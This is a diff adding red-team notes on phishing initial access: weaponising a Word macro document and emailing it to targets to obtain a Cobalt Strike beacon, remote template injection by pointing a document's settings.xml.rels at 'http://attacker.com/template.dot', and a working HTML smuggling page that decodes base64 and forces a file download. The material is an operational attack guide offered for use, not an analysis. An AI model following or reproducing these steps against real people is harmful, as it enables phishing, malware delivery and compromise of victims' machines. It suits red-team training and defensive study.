@@ -50,3 +50,76 @@ Sub AutoOpen()
 
 End Sub
 ```
+Remove username of your system from being embedded in document
+
+*File>Info>Inspect Document>Inspect Document*
+Click *Inspect* > *Remove All* next to *Document Properties and Personal Information* 
+
+Next save the word document with the macro as a *Word 97-2003(.doc)*
+
+Then upload to teamserver by going to *Site management > Host File*
+
+Attach the file in an email and send to targets. A user will need to click *Enable Editing* and then *Enable Content* to execute the macro.
+
+If executed you will receive a new beacon in Cobalt Strike.
+
+## Remote Template Injection
+Remote template injection is where you trick a user to open a document that downloads a malicious template. 
+
+Steps to follow
+1. Save the malicious macro file as a *Word 97-2003(.dot) file as your injection template
+2. Host this template in teamserver Cobalt Strike like above
+3. Create a new document from the blank template located in *C:\Users\Attacker\Documents\Custom Office Templates* as a .docx file.
+4. Right click this file in file explorer and select *7-zip>Open archive*
+5. Navigate to *word>_rels*
+6. Right click to Open and Edit the settings.xml.rels
+7. Scroll until you find the *Target* entry and change this to your teamservers malicious .dot file
+   ```
+   Target="http://attacker.com/template.dot"
+   ```
+8. Save this and email the target the document
+
+A lot of this can be done with this the [remoteinjector](https://github.com/JohnWoodman/remoteinjector) tool
+
+## HTML Smuggling
+A technique to use JavaScript to hide files from content fiters.
+
+Example HTML smuggling code
+```
+<html>
+    <head>
+        <title>HTML Smuggling</title>
+    </head>
+    <body>
+        <p>This is all the user will see...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
+```
+This still gets the MOTW on it as it was downloaded over the internet
